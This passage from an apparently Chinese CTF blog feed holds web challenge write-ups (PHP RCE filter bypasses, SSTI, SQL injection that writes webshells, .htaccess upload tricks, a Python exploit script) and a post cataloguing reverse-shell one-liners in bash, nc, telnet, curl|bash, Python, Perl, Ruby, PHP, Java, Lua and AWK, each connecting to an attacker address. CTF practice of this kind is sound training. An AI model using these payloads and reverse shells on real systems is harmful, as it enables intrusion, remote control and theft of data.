(!preg_match(&quot;/sh|wget|nc|python|php|perl|\\?|flag|&#125;|cat|echo|\\*|\\^|\\]|\\\\\\\\|&#x27;|\\&quot;|\\|/i&quot;,$num))&#123; echo &quot;my favorite num is:&quot;; system(&quot;echo &quot;.$num); &#125;else&#123; echo &#x27;Bonjour!&#x27;; &#125; &#125;&#125; else &#123; highlight_file(__FILE__);&#125; 看上去很简单，第一个地方的绕过利用php5的数组溢出漏洞绕过。接着第二个地方，num使用%0a绕过匹配，但是我们发现flag被过滤了，而且通配符也基本全军覆没。这里用到的是inode索引节点法。 payload： 1stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0Als -i / 查询到flag的节点为1704622，获取文件： 1stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0Atac `find / -inum 1704622` isc-05工控题，先在首页乱点一遍，发现就一个地方能进，进去后查看源代码，发现?page，猜测存在任意文件读取： 1?page=php://filter/convert.base64-encode/resource=index.php 读取到源码，这里放重要部分： 1234567891011121314151617//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125; 乍一看这里完全没有rce的点，其实这里要利用到preg_replace()在/e模式下会将替换后的语句作为php语句执行，因此我们构建payload： 1?pat=/a/e&amp;rep=system(&#x27;cat /flag&#x27;)&amp;sub=a mfw进网页随便点点发现?page=，尝试伪加密居然没用，然后翻审查元素发现让我们输入flag，但是输入后是空的。这里信息搜集发现git泄露，获取到index.php，审计代码： 1234567891011121314151617&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123; $page = $_GET[&#x27;page&#x27;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#x27;..&#x27; is dangerous!assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt; 这里我们直接闭合语句，然后根据代码中flag.php的位置插入rce，最后接注释就可以了： 1?page=mrl64&#x27;) or system(&#x27;cat templates/flag.php&#x27;);// Confusion1审查元素发现提示/container，进入后发现： 12&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt; 但尝试直接访问Flag文件与Salt文件都失败了，后来试了半天发现在/register.php发现了python的ssti，麻了这就是蛇吞象的含义吗。 尝试发现class的字符被过滤，但是request还在，因此用request解决就可以了，最终payload： 1register.php/&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read filemanager信息搜集发现/www.tar.gz泄露，审查一堆代码，发现完全没有注入空间，各种转义白名单，但其中该文件名的代码中存在这样一条语句： 1$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;); 这语句多像二次注入啊。我们审查文件是注意到extension是白名单，因此我们首先要置空白名单。我们首先上传一个空文件，命名为&#39;,extension=&#39;.png，接着更改文件名为shell.png。我们发现现在这个文件名字变成了shell.png.png，且sql语句现在如下： 1update `file` set `filename`=&#x27;upload.png&#x27;, `oldname`=&#x27;&#x27;,extension=&#x27;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot; 这里就相当于白名单置空了。接着我们上传带有一句马的shell.png文件，然后把shell.png改名为shell.php，蚁剑链接即可。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"unctf练习2","slug":"unctf练习2","date":"2022-03-16T13:27:23.000Z","updated":"2022-03-17T09:38:22.387Z","comments":true,"path":"2022/03/16/unctf练习2/","link":"","permalink":"http://example.com/2022/03/16/unctf%E7%BB%83%E4%B9%A02/","excerpt":"前言 继续刷，还有一些web没解决","text":"前言 继续刷，还有一些web没解决 easyflask进入网页后让我们登录admin，但是啥都没有，这里扫描器应该是可以扫出来的，但是我直接猜路由猜出来了…… /login路由登录，register路由注册，那么我们先注册一个admin再登录。 好像是环境问题，复现的时候页面不会跳转，应该会有个/secret_route_you_do_not_know路由，这个路由存在ssti，fuzz发现&#39;%&#39;, &#39;_&#39;, &#39;eval&#39;, &#39;open&#39;, &#39;flag&#39;,in, &#39;-&#39;, &#39;class&#39;, &#39;mro&#39;, &#39;[&#39;, &#39;]&#39;, &#39;\\&quot;&#39;, &#39;\\&#39;&#39;被过滤，因此使用attr和request.header.xn代替黑名单，取出eval执行，绕过下划线与引号，payload： 1?guess=&#123;&#123;()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.a)(117)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()&#125;&#125;&amp;class=__class__&amp;bases=__base__&amp;subclasses=__subclasses__&amp;a=__getitem__&amp;b=__init__&amp;c=__globals__&amp;d=get&amp;e=popen&amp;f=cat flag.txt&amp;g=read 传入获取flag 后来发现这题还有考flask session的伪造，应该是出题人数据库没弄好导致非预期了，先看session： 1eyJ1c2VybmFtZSI6Im1ybDY0In0.YjHmyg.GRqDKK3KExT0DN_Db_TYKi7Rf8g 这个和token是类似的东西，这里我们需要爆破出来secret_key，参考下面这篇博客：通过SECRET_KEY绕过flask的session认证 使用flask_unsign工具爆破出secret_key的值，然后伪造session绕过验证，从而登录admin。 easyphp一点都不ez的php审计，审计代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263 &lt;?php$adminPassword = &#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;;if (!function_exists(&#x27;fuxkSQL&#x27;)) &#123; function fuxkSQL($iText) &#123; $oText = $iText; $oText = str_replace(&#x27;\\\\\\\\&#x27;, &#x27;\\\\&#x27;, $oText); $oText = str_replace(&#x27;\\&quot;&#x27;, &#x27;&quot;&#x27;, $oText); $oText = str_replace(&quot;\\&#x27;&quot;, &quot;&#x27;&quot;, $oText); $oText = str_replace(&quot;&#x27;&quot;, &quot;&#x27;&#x27;&quot;, $oText); return $oText; &#125;&#125;if (!function_exists(&#x27;getVars&#x27;)) &#123; function getVars() &#123; $totals = array_merge($_GET, $_POST); if (count($_GET)) &#123; foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; if (is_array($value)) &#123; $temp_array = array(); foreach ($value as $key2 =&gt; $value2) &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $temp_array[$key2] = fuxkSQL(trim($value2)); &#125; else &#123; $temp_array[$key2] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value2)))); &#125; &#125; $&#123;$key&#125; = $_GET[$key] = $temp_array; &#125; else &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $&#123;$key&#125; = fuxkSQL(trim($value)); &#125; else &#123; $&#123;$key&#125; = $_GET[$key] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value)))); &#125; &#125; &#125; &#125; &#125;&#125;getVars();if (isset($source)) &#123; highlight_file(__FILE__);&#125;//只有admin才能设置环境变量if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123; echo &#x27;you can set config variables!!&#x27; . &#x27;&lt;/br&gt;&#x27;; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(&quot;\\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;); &#125; &#125;&#125; else &#123; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key)) &#123; echo ($GLOBALS[$key]) . &#x27;&lt;/br&gt;&#x27;; &#125; &#125;&#125; 直接先看主要部分，我们发现第一个匹配md5($password) === $adminPassword，但是那个$adminPassword根本就不是md5，因此我们要寻找一下可以利用的点。 12foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; 这个地方有一个变量覆盖，我们如果传入adminPassword=c4ca4238a0b923820dcc509a6f75849b的话就可以覆盖掉原题目中的这个变量，那么这个密码的md5就变成可控的了。 然后是sha1碰撞，弱类型比较直接找老朋友0e就可以了，因此这里的payload： 1?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704 继续看，要我们传入一个名称为var1或者var2的值，并且值的长度要小于12。这里有几种方法都能解决问题，php复杂，语句闭合等等都可以构造出rce，payload： 12345?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704&amp;var1=\\&quot;;$a();?&gt;&amp;a=phpinfo//语句闭合?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704&amp;var1=$&#123;$a()&#125;&amp;a=phpinfo//php复杂 phpmysql这题还是复习下吧，审计代码： 123456789101112131415161718192021222324252627282930 &lt;?phpshow_source(__FILE__);echo(&quot;欢迎来到unctf2021，have fun&quot;.&quot;&lt;br&gt;&quot;);$db_host=$_POST[&#x27;host&#x27;];$db_user=$_POST[&#x27;user&#x27;];$db_pwd=$_POST[&#x27;pwd&#x27;];$db_port=$_POST[&#x27;port&#x27;];if($db_host==&quot;&quot;)&#123; die(&quot;数据库地址不能为空！&quot;);&#125;if(is_numeric($db_host))&#123; echo(&quot;fakeflag is /flag&quot;.&quot;&lt;br&gt;&quot;); if(preg_match(&quot;/;|\\||&amp;/is&quot;,$db_user) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_pwd) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_port))&#123; die(&quot;嘉然今天吃什么&quot;); &#125; system(&quot;mysql -h $db_host -u $db_user -p $db_pwd -P $db_port --enable-local-infile&quot;);&#125;else&#123; echo(&quot;Maybe you can do someting else&quot;.&quot;&lt;br&gt;&quot;); if(!isset($db_user) || !isset($db_pwd))&#123; eval(&quot;echo new Exception(\\&quot;&lt;script&gt;alert(&#x27;关注嘉然，顿顿解馋！！！&#x27;);&lt;/script&gt;\\&quot;);&quot;); &#125; else&#123; $db_user = str_ireplace(&quot;SplFileObject&quot;, &quot;UNCTF2021&quot;, $db_user); eval(&quot;echo new $db_user($db_pwd);&quot;); &#125;&#125; 我们首先要定位到我们需要的rce上，这里能利用的应该是最后一句，因此我们就要对user与pwd大做文章。这里用语句闭合的方法，首先host是必须要的，随便输入一个非数字就可以了。接着是payload： 1host=a&amp;user=DirectoryIterator&amp;pwd=&quot;/&quot;);system(&quot;ls /&quot;);echo (&quot;1&quot; 利用DirectoryIterator使语句成立，并且配合pwd闭合语句，这样eval中就变成了： 1eval(&quot;echo new DirectoryIterator(&quot;/&quot;);system(&quot;ls /&quot;);echo (&quot;1&quot;);&quot;); 构造rce成功。 后来发现这题还有一种解法，异常报错执行rce： 1host=a&amp;user=exception&amp;pwd=system(&quot;ls /&quot;) 具体原理可以参考下面这篇博客：连异常报错也能拿到flag? 俄罗斯方块人大战奥特曼游戏关，找js，发现这样一串： 1234567const go = new Go();const name =&quot;blocks&quot;;const curWwwPath=window.document.location.href;const pathName=window.document.location.pathname;const pos=curWwwPath.indexOf(pathName);const localhostPath=curWwwPath.substring(0,pos);let url = `$&#123;localhostPath&#125;/$&#123;name&#125;.wasm.gz`; 发现存在wasm包，下载，打开后搜索flag，找到html文档，进入文档即可获取flag。 这题好水，就是说给游戏关的js寻找提供了一种思路吧。 EZ_IMAGE(misc)最后记一道拼图题，这题用到了两个工具：montage和gaps 下载附件后发现拿到的都是名字以unctf开头的图片，总共225张，用montage把图片整合： 1montage unctf*.jpg -tile 15x15 -geometry 60x60+0+0 test.jpg 接着用gaps工具进行拼图使图片复原： 1gaps --image=test.jpg --generation=30 --population=300 --size=60 获得flag。这两个工具对于拼图处理有很强大的作用，可以说又收集到新工具了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"unctf练习1","slug":"unctf练习1","date":"2022-03-14T13:03:42.000Z","updated":"2022-03-15T13:31:10.122Z","comments":true,"path":"2022/03/14/unctf练习1/","link":"","permalink":"http://example.com/2022/03/14/unctf%E7%BB%83%E4%B9%A01/","excerpt":"前言 unctf的平台上还有前两年的赛题，本着不做白不做的精神，我们做一下。","text":"前言 unctf的平台上还有前两年的赛题，本着不做白不做的精神，我们做一下。 ezphp审计源码： 123456789101112&lt;?phpshow_source(__FILE__);$username = &quot;admin&quot;;$password = &quot;password&quot;;include(&quot;flag.php&quot;);$data = isset($_POST[&#x27;data&#x27;])? $_POST[&#x27;data&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($data);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125; 我们要送一个序列化数组进去，但是要让username的值为admin，password的值为password。直接构造这个数组序列化是通不过的，因为反序列化的结果就是个Array。 这里要运用到布尔的trick，bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。 因此构建payload： 1data=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; 传入得到flag。 L0vephp进入网页提示我们查看源码，右键被ban就f12，发现：B4Z0-@:OCnDf, 测试下是base85，解出来是get action，但是没有源码出现，继续尝试任意文件读取： 12?action=php://filter/read=string.toupper|string.rot13/resource=flag.php//base64被过滤了 源码中发现出现了新内容： 123456?CUC$SYNT = &quot;HAPGS&#123;7UVF_VF_@_S4XR_S1N9&#125;&quot;;//UVAG:316R4433782R706870? rot13解密： 123456?php$flag = &quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;;//hint:316e4433782e706870? hint中16进制转字符串：1nD3x.php 进入后这下要读源码了： 123456789101112131415161718192021222324252627282930 &lt;?php error_reporting(0);show_source(__FILE__);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;\\`&#x27;,&#x27;\\+&#x27;,&#x27;\\-&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\\\\\\\&#x27;,&#x27;\\/&#x27;); $__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);$blacklist1 = array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)&gt;16)&#123; die(&#x27;Too long&#x27;);&#125;foreach ($blacklist1 as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; die(&#x27;WTF???&#x27;); &#125; &#125; foreach ($blacklist2 as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;Sry,try again&#x27;); &#125;&#125;@eval($code);?&gt; 绕rce，除了waf还限制了长度，之前能用的方法基本是绝了。但是p牛之前有一篇博客：eval长度限制绕过 &amp;&amp; PHP5.6新特性 这篇博客里介绍了一个方法——数组展开，payload： 12?1[]=test&amp;1[]=system(&#x27;ls&#x27;);&amp;2=assertPOST:code=usort(...$_GET); 最后命令执行获取flag。 easyunserialize审计源码： 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 很经典的一道反序列化字符串逃逸，我们审计代码发现只要让password的值为easy就可以了，但是题目设置了变量password的值恒定为1，因此我们只能通过反序列化字符串逃逸的方式让password逃逸出来。 我们先构造密码部分需要逃逸的反序列化： 1&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; 总共29个字符，接着发现源码中的替换逻辑是增加4个字符，因此需要进行8次替换，并且还需要补3位。不过由于反序列化结束后不会继续的原理，把这三位字符补到最后就可以了。 构建payload，传入获取flag： 1challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;ook checkin-sql这题做的都麻了，看了wp才懂。首先这里是单引号sql，并且过滤了一众函数导致常用注入手段失效。题目提示我们flag不在数据库中，那很有可能就是文件写入了，但是我试图直接写马发现写不进去。 然后就歇了，看wp发现要利用到mysql的储存过程进行写入，先放两个地址在这：MySQL 存储过程 | 菜鸟教程MySQL存储过程 | 博客园 payload： 1234567891011121314151617&lt;?php$a = &quot;1&#x27;; create procedure `mrl64`(out string text(1024), in hex text(1024)) BEGIN SET string = hex; END; ;#&quot;;echo urlencode($a).&quot;\\n&quot;;$b = &quot;1&#x27;; call `mrl64`(@decoded, 0x73656c65637420273c3f706870206576616c28245f504f53545b226d726c3634225d293b203f3e2720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f7368656c6c2e706870223b); prepare payload from @decoded; execute payload; ;#&quot;;echo urlencode($b);?&gt;//select &#x27;&lt;?php eval($_POST[&quot;mrl64&quot;]); ?&gt;&#x27; into outfile &quot;/var/www/html/shell.php&quot;; 接着写入就可以了，exp: 1234567891011121314151617181920import requests url = &quot;http://844ce818-1804-499f-b859-ca599c2805c5.node1.hackingfor.fun/&quot;payload1 = &quot;1&#x27;%3B%0D%0A%20%20%20%20create%20procedure%20%60mrl64%60(out%20string%20text(1024),%20in%20hex%20text(1024))%0D%0A%20%20%20%20BEGIN%0D%0A%20%20%20%20%20%20%20%20SET%20string%20%3D%20hex%3B%0D%0A%20%20%20%20END%3B%0D%0A%20%20%20%20%3B%23&quot;//传入mysql传入过程部分payload2 = &quot;1&#x27;%3B%0D%0A%20%20%20%20call%20%60mrl64%60(%40decoded,%200x73656c65637420273c3f706870206576616c28245f504f53545b226d726c3634225d293b203f3e2720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f7368656c6c2e706870223b)%3B%0D%0A%20%20%20%20prepare%20payload%20from%20%40decoded%3B%0D%0A%20%20%20%20execute%20payload%3B%0D%0A%20%20%20%20%3B%23&quot;//写入shell.php，密码mrl64 data = &#123; &quot;mrl64&quot;:&quot;system(&#x27;cat /fffllaagg&#x27;);&quot;&#125; requests.get(url=url+&quot;?inject=&quot;+payload1)requests.get(url=url+&quot;?inject=&quot;+payload2) ans = requests.post(url+&quot;shell.php&quot;,data=data)print(ans.text) 跑脚本就可以得到flag。 babywrite这个是2021那次的题，当时太菜了没做出来，这里就复现下。 审计代码： 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);$sandbox = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (!is_dir($sandbox)) &#123; mkdir($sandbox);&#125;if (isset($_GET[&#x27;filename&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;])) &#123; $filename = $_GET[&#x27;filename&#x27;]; $content = $_GET[&#x27;content&#x27;]; if (preg_match_all(&quot;/ph|\\.\\.|\\//i&quot;, $filename) || strlen($filename) &gt; 10) &#123; die(&quot;No way!&quot;); &#125; if (preg_match_all(&quot;/&lt;\\?|ph/&quot;, $content)) &#123; die(&quot;No way!&quot;); &#125; $filename = $sandbox . &quot;/&quot; . $filename; @file_put_contents($filename, $content); echo $filename;&#125; 很经典的写入，很粗暴的waf，很卑鄙的限制长度。首先发现php文件是不能直接上传的，这意味着我们只能上传图片马，那上传图片马自然就想到要用到.htaccess。 当时是真的菜，居然连数组绕过正则匹配都不知道，然后就卡在这了半天死活做不出来，现在懂了所以就简单了。 我们传入： 1?filename=.htaccess&amp;content[]=AddType application/x-httpd-php .png 然后传入shell： 1?filename=1.png&amp;content[]=&lt;?php @eval($_POST[&#x27;mrl64&#x27;]); 最后直接rce就可以了： 1mrl64=system(&#x27;cat /flag&#x27;);","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"总结反弹shell","slug":"总结反弹shell","date":"2022-03-13T07:45:23.000Z","updated":"2022-03-13T08:51:57.933Z","comments":true,"path":"2022/03/13/总结反弹shell/","link":"","permalink":"http://example.com/2022/03/13/%E6%80%BB%E7%BB%93%E5%8F%8D%E5%BC%B9shell/","excerpt":"前言 当面对无回显rce或者系统函数被限制时等等情况，反弹shell是一个解决问题的好选择，因此这篇博客会简单介绍反弹shell的原理以及总结一些反弹shell的方法","text":"前言 当面对无回显rce或者系统函数被限制时等等情况，反弹shell是一个解决问题的好选择，因此这篇博客会简单介绍反弹shell的原理以及总结一些反弹shell的方法 常见的反弹shellbash反弹命令： 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1 依次解释： bash -i代表着打开一个交互的bash &gt;表示重定向，目标是/dev/tcp/攻击主机ip/port &amp;表示后台运行，如果不加的话服务端仅会发送一个TCP /dev/tcp/攻击主机ip/port表示是调用socket，建立socket连接 0&gt;&amp;1表示标准输入重定向到标准输出，实现你与反弹出来的shell的交互 bash方法的反弹shell还有其他方法可以实现，例如： 12exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done 第一条命令建立tcp连接，并将标准输入输出作为device 5的标准输入输出。第二条cat &lt;&amp;5获取device5的输入；while read line; do $line 2&gt;&amp;5 &gt;&amp;5一旦获取到命令便运行，然后将标准输入输出以及标准错误输出到device5中。 或者： 12345exec 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196/bin/bash -i &gt; /dev/tcp/attackerip/port 0&lt;&amp;1 2&gt;&amp;1关闭设备 用 exec [num]&gt;&amp;- 原理都是类似的，但是由于linux发行版的不同，导致一些版本不能进行bash反弹shell，例如ubuntu。 nc反弹命令1： 1nc -e /bin/bash x.x.x.x port 这个使用也挺多的，但是如果服务器没有装nc或者nc不带e参数就用不了了，因此这时候就要用他的代餐了（bushi）。 命令2： 1rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x port &gt;/tmp/f 同样解释一下： rm /tmp/f 删除命令 mkfifo /tmp/f; 在tmp目录下写fifo文件f /bin/sh -i 2&gt;&amp;1 将/bin/sh的标准错误重定向到标准输出 nc x.x.x.x 2333 &gt;/tmp/f将nc监听到的输入输入到fifo 注意，应该是先获得输入输出然后将结果通过管道到nc客户端 命令3： 1nc x.x.x.x port1|/bin/bash|nc x.x.x.x port2 这个比较简单，从port1端口获取命令，bash运行后将结果返回到port2中。 telnet反弹使用这个方法时，需要监听两个端口，接着在目标主机执行命令： 1telnet x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2 得到反弹shell后，port1终端输入命令，port2终端就会获得执行相应命令后的结果。 curl反弹在vps上先放一个脚本，内容就是bash反弹的payload，然后执行命令就可以了： 1curl x.x.x.x/bash |bash 常见的脚本反弹pythonexp： 1python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;x.x.x.x&#x27;,port);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot; perlexp1： 1perl -e &#x27;use Socket;$i=&quot;[x.x.x.x]&quot;;$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; exp2: 1perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27; Rubyexp: 1ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27; PHPexp： 1php -r &#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; Javaexp: 12345678910111213 public class Revs &#123; /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception &#123; // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p = r.exec(cmd); p.waitFor(); &#125;&#125; Luaexp: 1lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot; AWK攻击机器用的监听，不能输入enter，否则会断开。exp： 1awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27; 总结上面那些反弹shell的方法有些已经通过做题学习过，有些通过本地试验过，而有些还没有测试过，这篇博客主要是进行记录，如果碰到什么新的方法也会进行补充。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -shell","slug":"web-shell","permalink":"http://example.com/tags/web-shell/"}]},{"title":"NSSCTF练习2","slug":"NSSCTF练习2","date":"2022-03-12T08:20:08.000Z","updated":"2022-03-13T05:57:14.417Z","comments":true,"path":"2022/03/12/NSSCTF练习2/","link":"","permalink":"http://example.com/2022/03/12/NSSCTF%E7%BB%83%E4%B9%A02/","excerpt":"前言 继续刷NSSCTF，web的内容还是很杂的，多刷题还是能学到很多东西的。","text":"前言 继续刷NSSCTF，web的内容还是很杂的，多刷题还是能学到很多东西的。 finalrce审计代码： 123456789101112131415 &lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123; $url=$_GET[&#x27;url&#x27;]; if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url)) &#123; echo &quot;Sorry,you can&#x27;t use this.&quot;; &#125; else &#123; echo &quot;Can you see anything?&quot;; exec($url); &#125;&#125; 这题也是过滤比较狠的rce，而且使用的是exec()，这个函数是没有回显的，按平常来说可以反弹shell，但这里的过滤太狠了，几乎堵死这条路了。因此我们要学习一个特殊的linux命令：tee tee：将想要执行的命令写进文件中，当访问这个文件后执行命令 因此我们构建这样的payload： 1dir /|tee mrl64 接着我们访问/mrl64，就可以读取到根目录了，cat被过滤了，解决方法还是很多的，之前写到的无字符webshell就可以利用，也可以使用引号进行绕过，也可以用sort代替，等等，这里给出一种payload： 1?url=sort /flllll&#x27;&#x27;aaaaaaggggggg|tee mrl64 [CSAWQual 2019]Unagi一进网页先到处翻翻，发现提示： 12345678910111213141516&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; 